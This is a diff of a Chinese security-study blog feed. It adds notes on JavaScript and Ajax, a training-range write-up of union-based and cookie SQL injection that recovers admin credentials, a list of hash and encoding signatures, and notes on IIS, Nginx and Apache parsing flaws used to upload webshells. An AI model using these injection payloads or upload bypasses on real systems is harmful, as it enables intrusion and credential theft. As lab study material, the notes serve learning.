+<h3 id="JS对象"><a href="#JS对象" class="headerlink" title="JS对象"></a>JS对象</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">dom</span><br><span class="line">    当网页被加载时，浏览器会创建页面的文档对象模型；</span><br><span class="line">    html dom模型被构造为对象的树</span><br><span class="line">js获取文档对象</span><br><span class="line">    js操作时，一定先获取元素对象（js可以操作所有的html标签，内容、属性、样式皆可操作。）</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> 定义新名 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ID原名称&#x27;</span>)；</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(新名.<span class="property">innerHTML</span>);<span class="comment">//获取元素内容</span></span></span><br><span class="line"><span class="language-javascript">            新名.<span class="property">innerHTML</span> = <span class="string">&#x27;新内容&#x27;</span>；</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h3><p>在 HTML 中, 全局变量是 window 对象，所以window 对象可以调用函数内的局部变量。</p>
+<p><strong>注意：</strong>所有数据变量都属于 window 对象。</p>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//此处可使用 window.carName</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span><span class="params">()</span> &#123;</span><br><span class="line">    carName = <span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h3><h4 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h4><figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">onclick</span>             当鼠标点击时。</span><br><span class="line">ondblclick          当鼠标双击时。</span><br><span class="line">onmouseover         当鼠标在元素上经过时</span><br><span class="line">onmouseout          当鼠标在元素上离开时</span><br><span class="line">onmousedown         当鼠标按键按下时</span><br><span class="line">onmouseup           当鼠标按键松开时</span><br><span class="line">onmousemove         当鼠标移动时</span><br></pre></td></tr></table></figure>
+<h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">onkeydown</span>     当键盘按键按下时</span><br><span class="line">onkeyup       当键盘按键松开时</span><br><span class="line">onkeypress    当键盘按键一直按着时</span><br></pre></td></tr></table></figure>
+<h4 id="表单事件"><a href="#表单事件" class="headerlink" title="表单事件"></a>表单事件</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">onsubmit</span>    当表单被提交时</span><br><span class="line">onreset     当表单被重置时</span><br><span class="line">onfocus     当元素获得焦点时</span><br><span class="line">onblur      当元素失去焦点时</span><br><span class="line">onselect    当元素文本被选中时</span><br><span class="line">onchange    当元素值被改变时</span><br></pre></td></tr></table></figure>
+<h4 id="其他事件"><a href="#其他事件" class="headerlink" title="其他事件"></a>其他事件</h4><h2 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h2><p> async javascript and XML(异步JavaScript和XML)</p>
+<p>是前后台交互的能⼒ 也就是我们客户端给服务端发送消息的⼯具，以及接受响应的⼯具。AJAX 是与服务器交换数据并更新部分网页的艺术，在不重新加载整个页面的情况下。是⼀个 默认异步执⾏机制的功能,AJAX分为同步（async = false）和异步（async = true）</p>
+<h3 id="创建Ajax语句"><a href="#创建Ajax语句" class="headerlink" title="创建Ajax语句"></a>创建Ajax语句</h3><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">变量名 = <span class="keyword">new</span> <span class="type">XMLHttpRequest</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="浏览器窗口属性"><a href="#浏览器窗口属性" class="headerlink" title="浏览器窗口属性"></a>浏览器窗口属性</h3><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xmlhttp</span><br><span class="line"><span class="keyword">if</span>(window.XMLHttpRequest)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// IE7+,Firefox,Chrome,Opera,Safari</span></span><br><span class="line">	xmlhttp=<span class="keyword">new</span> <span class="type">XMLHttpRequest</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">//IE6,IE5</span></span><br><span class="line">	xmlhttp=<span class="keyword">new</span> <span class="type">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="向服务器发送请求"><a href="#向服务器发送请求" class="headerlink" title="向服务器发送请求"></a>向服务器发送请求</h3><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">变量名.open(<span class="keyword">method</span>,<span class="title function_">url</span>,<span class="title function_">async</span>)</span><br><span class="line">		  <span class="title function_">method</span>:请求的类型：GET或POST</span><br><span class="line">		  url:文件在服务器上的位置</span><br><span class="line">		  <span class="keyword">async</span>:<span class="keyword">true</span>(异步)或<span class="keyword">false</span>(同步)</span><br><span class="line">变量名.send(string)</span><br><span class="line">		  string:仅用于POST请求</span><br></pre></td></tr></table></figure>
+<h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"># 缓存结果</span><br><span class="line">xmlhttp.open(<span class="string">&quot;<span class="keyword">GET</span>&quot;</span>,<span class="string">&quot;url&quot;</span>,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line"></span><br><span class="line"># 非缓存需要添加一个唯一的ID</span><br><span class="line">xmlhttp.open(<span class="string">&quot;<span class="keyword">GET</span>&quot;</span>,<span class="string">&quot;url?t=&quot;</span> + Math.random(),true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line"></span><br><span class="line"># GET方法发送信息</span><br><span class="line">xmlhttp.open(<span class="string">&quot;<span class="keyword">GET</span>&quot;</span>,<span class="string">&quot;url?fname=Henry&amp;lname=Ford&quot;</span>,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+<h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">xmlhttp.<span class="keyword">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send<span class="literal">()</span>;</span><br><span class="line"></span><br><span class="line"># 像HTML表单那样POST数据，使用set<span class="constructor">RequestHeader()</span>添加HTTP头。</span><br><span class="line">xmlhttp.<span class="keyword">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.set<span class="constructor">RequestHeader(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span>;</span><br><span class="line">xmlhttp.send(<span class="string">&quot;fname=Henry&amp;lname=Ford&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="事件onreadystatechange"><a href="#事件onreadystatechange" class="headerlink" title="事件onreadystatechange"></a>事件onreadystatechange</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">当我们的请求发送到服务器后，执行一些基于响应的反应</span><br><span class="line">onreadystatechange  每当 readyState 属性改变时，就会调用该函数。</span><br><span class="line">readyState    存有 XMLHttpRequest 的状态信息</span><br><span class="line"><span class="bullet">          *</span>   0: 请求未初始化</span><br><span class="line"><span class="bullet">          *</span>   1: 服务器连接已建立</span><br><span class="line"><span class="bullet">          *</span>   2: 请求已接收</span><br><span class="line"><span class="bullet">          *</span>   3: 请求处理中</span><br><span class="line"><span class="bullet">          *</span>   4: 请求已完成，且响应已就绪</span><br><span class="line">status    网页状态码</span><br></pre></td></tr></table></figure>
+<h3 id="获取响应"><a href="#获取响应" class="headerlink" title="获取响应"></a>获取响应</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">responseText    <span class="regexp">//</span>获得字符串形式的响应数据。</span><br><span class="line">responseXML     <span class="regexp">//</span>获得 XML 形式的响应数据。</span><br></pre></td></tr></table></figure>
+<h3 id="其他语句"><a href="#其他语句" class="headerlink" title="其他语句"></a>其他语句</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">innerHTML    设置或返回表格行的开始和结束标签之间的 <span class="selector-tag">HTML</span>。</span><br></pre></td></tr></table></figure>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>创建ajak对象</span><br><span class="line">ajak = new XMLHttpRequest();</span><br><span class="line"><span class="regexp">//</span>通过GET方式打开url</span><br><span class="line">ajak.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;/checkUser.php?name=&quot;</span>+username)</span><br><span class="line"><span class="regexp">//</span>发送请求</span><br><span class="line">ajak.send();</span><br><span class="line">                    </span><br><span class="line"><span class="regexp">//</span>当状态发生改变时，做什么</span><br><span class="line">ajak.onreadystatechange = <span class="keyword">function</span>() &#123;</span><br><span class="line"><span class="regexp">//</span>状态为<span class="number">4</span>和响应码为<span class="number">200</span></span><br><span class="line">  <span class="keyword">if</span> (ajak.readyState == <span class="number">4</span> &amp;&amp; ajak.status == <span class="number">200</span>)&#123;</span><br><span class="line">  <span class="regexp">//</span>获取相应的内容</span><br><span class="line">    <span class="regexp">//</span> alert(ajak.responseText)</span><br><span class="line">    <span class="keyword">if</span> (ajak.responseText == <span class="number">1</span>)&#123;</span><br><span class="line">      <span class="regexp">//</span> alert(<span class="string">&quot;用户名已存在&quot;</span>)</span><br><span class="line">      user_msg.innerHTML = <span class="string">&quot;&lt;font color=&#x27;#ff69b4&#x27;&gt;名字不可用&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="regexp">//</span> alert(<span class="string">&quot;用户名可以用&quot;</span>)</span><br><span class="line">      user_msg.innerHTML = <span class="string">&quot;&lt;font color=&#x27;#7fff00&#x27;&gt;名字可用&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>封神台</title>
+    <url>/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>靶场的学习记录</p>
+<span id="more"></span>
+<h1 id="1-1-sql注入"><a href="#1-1-sql注入" class="headerlink" title="1-1 sql注入"></a>1-1 sql注入</h1><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">or</span> <span class="attribute">1</span>=1</span><br><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">or</span> <span class="attribute">1</span>=2</span><br><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=2</span><br></pre></td></tr></table></figure>
+<p>得到为数字型盲注</p>
+<p>构造payload放入bp中爆破字段数<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710212913884.png" alt="image-20230710212913884"></p>
+<p><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710212756107.png" alt="image-20230710212756107"><br>得到字段数为2</p>
+<p>构造payload查看注入点：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">and</span> <span class="attribute">1</span>=2 union select 1,2</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710213148320.png" alt="image-20230710213148320"></p>
+<p>获得数据库名<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710213227447.png" alt="image-20230710213227447"></p>
+<p>获得表名<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710213653456.png" alt="image-20230710213653456"></p>
+<p>获得字段名<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710213752104.png" alt="image-20230710213752104"></p>
+<p>获得信息<img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710213904386.png" alt="image-20230710213904386"><br>得到账户admin，密码hellohack</p>
+<h1 id="1-2：sql注入——waf绕过"><a href="#1-2：sql注入——waf绕过" class="headerlink" title="1-2：sql注入——waf绕过"></a>1-2：sql注入——waf绕过</h1><p>判断注入类型，但是被拦截了<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710214100842.png" alt="image-20230710214100842"></p>
+<p>但是order没有被过滤，查看字段数，得到字段数为10<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710214257340.png" alt="image-20230710214257340"></p>
+<p>判断是否可以cookie注入，去掉url中?id=xxx部分，页面不能正常显示则证明参数直接作用<br>javascript:alert(document.cookie=”id=”+escape(“171”));<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710220521903.png" alt="image-20230710220521903"><br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710220539261.png" alt="image-20230710220539261"></p>
+<p>证明存在cookie注入</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.<span class="attribute">cookie</span>=<span class="string">&quot;id=&quot;</span>+escape(&quot;171 <span class="keyword">and</span> <span class="attribute">1</span>=2 union select 1,2,3,4,5,6,7,8,9,10 <span class="keyword">from</span> admin<span class="string">&quot;));</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710222553322.png" alt="image-20230710222553322"></p>
+<p>看到回显点2，3，7，8，9</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">JavaScript:alert(document.<span class="attribute">cookie</span>=<span class="string">&quot;id=&quot;</span>+escape(&quot;171 <span class="keyword">and</span> <span class="attribute">1</span>=2 union select 1,username,password,4,5,6,7,8,9,10 <span class="keyword">from</span> admin<span class="string">&quot;));</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710223034956.png" alt="image-20230710223034956"></p>
+<p>密码为16位，大概率是md5，解密得welcome</p>
+<p>扫描目录，获得管理员登录界面<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710225743087.png" alt="image-20230710225743087"></p>
+<p>获取key<br><img src="/2023/07/10/%E5%B0%81%E7%A5%9E%E5%8F%B0/image-20230710225810723.png" alt="image-20230710225810723"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>常见加密特征</title>
+    <url>/2023/07/10/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%89%B9%E5%BE%81/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>各种加密算法的密文特征</p>
+<span id="more"></span>
+<h1 id="常见加密特征"><a href="#常见加密特征" class="headerlink" title="常见加密特征"></a>常见加密特征</h1><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><p>一般是16位或32位由数字或字母所组成的字符串</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">21232F297A57A5A743894A0E4A801FC3</span><br></pre></td></tr></table></figure>
+<h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1"></a>sha1</h3><p>与md5差不多，位数是40</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">d<span class="number">033e22</span>ae<span class="number">348</span>aeb<span class="number">5660</span>fc<span class="number">2140</span>aec<span class="number">35850</span><span class="keyword">c</span><span class="number">4</span>da<span class="number">997</span></span><br></pre></td></tr></table></figure>
+<h3 id="sha224"><a href="#sha224" class="headerlink" title="sha224"></a>sha224</h3><p>与md5差不多，加密结果是56位数字加小写字母</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">765330e48dc31606f27f2918834a888cb72689542de3b5567522b4df</span><br></pre></td></tr></table></figure>
+<h3 id="sha256"><a href="#sha256" class="headerlink" title="sha256"></a>sha256</h3><p>加密结果是64位数字加小写字母组合</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">807</span>d<span class="number">0</span>fbcae<span class="number">7</span><span class="keyword">c</span><span class="number">4</span>b<span class="number">20518</span>d<span class="number">4</span>d<span class="number">85664</span>f<span class="number">6820</span>aafdf<span class="number">936104122</span><span class="keyword">c</span><span class="number">5073e7744</span><span class="keyword">c</span><span class="number">46</span><span class="keyword">c</span><span class="number">4</span>b<span class="number">87</span></span><br></pre></td></tr></table></figure>
+<h3 id="sha384"><a href="#sha384" class="headerlink" title="sha384"></a>sha384</h3><p>加密结果是96位数字加小写字母组合</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">54</span>fb<span class="number">3</span>bd<span class="number">9</span>d<span class="number">6052999</span>fbf<span class="number">5</span>bbd<span class="number">397</span>f<span class="number">483</span>d<span class="number">2</span>af<span class="number">35461</span>fec<span class="number">3</span><span class="keyword">c</span><span class="number">1</span>a<span class="number">8886</span>f<span class="number">52109950</span>aeea<span class="number">611</span>a<span class="number">58</span>ddf<span class="number">7</span><span class="keyword">c</span><span class="number">17</span>efb<span class="number">80</span>f<span class="number">7</span>a<span class="number">754272</span>dbd<span class="number">4955</span>d<span class="number">9</span>b<span class="number">974</span>ee<span class="number">506</span>db<span class="number">6e499</span>e<span class="number">5</span>b<span class="number">162</span>fa<span class="number">7848092</span>d<span class="number">2616694</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span><span class="number">29e0295298184</span>e<span class="number">110607</span>b<span class="number">3</span>bbfe<span class="number">10</span>fb<span class="number">572</span>d<span class="number">8</span>f<span class="number">5</span><span class="keyword">c</span><span class="number">4</span>d<span class="number">6e78</span>fb<span class="number">30</span>dee<span class="number">83</span>da<span class="number">69</span>bf<span class="number">85</span>a<span class="number">8e7</span>fa<span class="number">444241</span>b<span class="number">9</span>b<span class="number">880</span>b<span class="number">1</span><span class="keyword">c</span><span class="number">9</span></span><br></pre></td></tr></table></figure>
+<h3 id="sha512"><a href="#sha512" class="headerlink" title="sha512"></a>sha512</h3><p>加密结果是128位数字加小写字母组合</p>
+<h3 id="base100"><a href="#base100" class="headerlink" title="base100"></a>base100</h3><p>一堆emoji表情</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">👝👣👘👞👲👫👟👠👪👖👠👪👖👝👣👘👞👴</span><br></pre></td></tr></table></figure>
+<h3 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h3><p>由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;?@[]^_`{|}~”）组成,不支持中文进行加密</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable">@iH</span>&lt;,&#123;zvx<span class="comment">#Vsjmzh<span class="doctag">@iH</span>&lt;R&#125;A</span></span><br></pre></td></tr></table></figure>
+<h3 id="base85"><a href="#base85" class="headerlink" title="base85"></a>base85</h3><p>等号一般出现在字符串中间,但是很难出现等号，含有一些奇怪的字符</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="constructor">Ao(<span class="params">mgHZWq8F</span>&#x27;<span class="params">iX</span>&amp;?Y4+<span class="params">_B70</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">YWRtaW4tcm9vdA</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+<h3 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h3><p>它最大的特点是没有等号</p>
+<p>Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+“和”/“符号。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">6tmHCZvhgfNjQu</span><br></pre></td></tr></table></figure>
+<h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p>他的特点是明文超过十个后面就会有很多等号</p>
+<p>如果不足40位，则在编码后数据补充”=”，一个”=”相当于一个组(5个二进制位)，编码后的数据是原先的8/5倍.</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GEZDGNBVGY3TQOJQGE</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+<h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><p>它的特点是没有等号并且数字要多于字母</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">61646D696E</span><br></pre></td></tr></table></figure>
+<h3 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h3><p>以 <code>\u</code>、<code>&amp;#</code> 或 <code>&amp;#x</code> 开头，后面是数字加字母组合</p>
+<p><code>\u</code> 开头和 <code>&amp;#x</code> 开头是一样的，都是16进制 Unicode 字符的不同写法，<code>&amp;#</code> 则是 Unicode 字符10进制的写法</p>
+<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line"><span class="character">\u0031</span><span class="character">\u0032</span><span class="character">\u0033</span><span class="character">\u0034</span><span class="character">\u0035</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>
+<h3 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h3><p>Escape 不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： <code>* @ - _ + . /</code>，其他所有的字符都会被转义序列替换</p>
+<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">明文：我爱akali</span><br><span class="line">密文：<span class="built_in">%u</span>6211<span class="built_in">%u</span>7231akali</span><br></pre></td></tr></table></figure>
+<h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>只对字母进行加密，常用于CTF比赛中</p>
+<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">iodj</span><span class="template-variable">&#123;khoor_zrug_123&#125;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>解析漏洞</title>
+    <url>/2023/07/10/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>常见web服务器的解析漏洞</p>
+<span id="more"></span>
+<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS5-x-6-x解析漏洞"><a href="#IIS5-x-6-x解析漏洞" class="headerlink" title="IIS5.x-6.x解析漏洞"></a>IIS5.x-6.x解析漏洞</h2><p>使用该版本的服务器，大多数是windows server 2003.该解析漏洞也只能解析asp文件，不能解析aspx文件</p>
+<h3 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a>目录解析漏洞</h3><p>网站目录中存在*.asp/的文件夹，这个文件夹下所有内容都会被IIS当作asp脚本来执行，例如/xx.asp/xx.jpg</p>
+<h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>IIS6.0中的分号(;)漏洞，IIS在解析文件名的狮虎会将分号后面的内容丢弃，可以再上传的时候给后面加上分号来避免黑名单过滤，如a.asp;jpg</p>
+<h3 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h3><ul>
+<li>/test.asa</li>
+<li>/test.cer</li>
+<li>/test.cdx</li>
+</ul>
+<h2 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03" class="headerlink" title="IIS 7.0/IIS 7.5/Nginx &lt; 8.03"></a>IIS 7.0/IIS 7.5/Nginx &lt; 8.03</h2><p>IIS 7.0/7.5，默认 Fast-CGI 开启。如果直接在 url 中图片地址（<em>.jpg）后面输入/</em>.php，会把正常图片解析为 php 文件。</p>
+<h3 id="PHP-CGI漏洞"><a href="#PHP-CGI漏洞" class="headerlink" title="PHP CGI漏洞"></a>PHP CGI漏洞</h3><p>PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:\wamp\bin\php\php5.3.10\php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。</p>
+<p><a href="http://ip/1.jpg/1.php，1.jpg会被当作PHP脚本来解析，此时1.php是不存在的。这就意味着攻击者可以上传合法的“图片”（图片木马），然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。">http://ip/1.jpg/1.php，1.jpg会被当作PHP脚本来解析，此时1.php是不存在的。这就意味着攻击者可以上传合法的“图片”（图片木马），然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。</a></p>
+<h2 id="Nginx空字节漏洞"><a href="#Nginx空字节漏洞" class="headerlink" title="Nginx空字节漏洞"></a>Nginx空字节漏洞</h2><p>影响版本：0.5、0.6、0.7&lt;=0.7.65、0.8&lt;=0.8.37</p>
+<p><a href="http://127.0.0.1/1.jpg%00.php">http://127.0.0.1/1.jpg%00.php</a> 会把1.jpg文件（木马文件）当做php文件来执行。</p>
+<h2 id="Apache-1-x、2-x-解析漏洞"><a href="#Apache-1-x、2-x-解析漏洞" class="headerlink" title="Apache (1.x、2.x) 解析漏洞"></a>Apache (1.x、2.x) 解析漏洞</h2><p>Apache（1.x,2.x）解析文件的原则：Apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar、gif等扩展名是Apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。</p>
+<p>​     假如上传文件1.php.bb.rar，后缀名rar不认识，向前解析；1.php.bb，后缀名bb不认识，向前解析；1.php 最终解析结果为php文件。如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。</p>
+<h2 id="windows解析漏洞"><a href="#windows解析漏洞" class="headerlink" title="windows解析漏洞"></a>windows解析漏洞</h2><p>在Windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，Windows会默认除去空格或点。黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样就可以getshell。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>empire_lupin_one</title>
     <url>/2023/07/05/empire-lupin-one/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>sudo提权的一次尝试</p>
@@ -781,25 +1235,24 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h3><p>?file=file://[文件绝对路径+文件名]</p>
 <p>专门用于访问本地文件系统，可以对本地文件进行读取</p>
 <h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>注意：entype=”multipart/form-data”时，该协议是无效的</p>
-<p><img src="/2023/07/04/file-include/file_include\image-20230704153917485.png" alt="image-20230704153917485"></p>
-<p><img src="/2023/07/04/file-include/file_include\image-20230704153938051.png" alt="image-20230704153938051"></p>
+<p><img src="/2023/07/04/file-include/image-20230704153917485.png" alt="image-20230704153917485"></p>
+<p><img src="/2023/07/04/file-include/image-20230704153938051.png" alt="image-20230704153938051"></p>
 <h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>支持zip、phar格式的文件包含</p>
 <h4 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h4><p>利用条件：php版本大于等于5.3.0</p>
 <p>配合文件上传漏洞，当仅可以上传zip格式时。</p>
 <p>配合文件上传漏洞，当仅可以上传图片格式</p>
-<p><img src="/2023/07/04/file-include/file_include\image-20230704155348343.png" alt="image-20230704155348343"></p>
+<p><img src="/2023/07/04/file-include/image-20230704160342014.png" alt="image-20230704160342014"></p>
 <h4 id="phar-1"><a href="#phar-1" class="headerlink" title="phar"></a>phar</h4><p>利用条件：php.ini中phar.readonly=off</p>
-<p><img src="/2023/07/04/file-include/file_include\image-20230704155415286.png" alt="image-20230704155415286"></p>
+<p><img src="/2023/07/04/file-include/image-20230704163203919.png" alt="image-20230704163203919"></p>
 <p>编写恶意phar文件的php脚本</p>
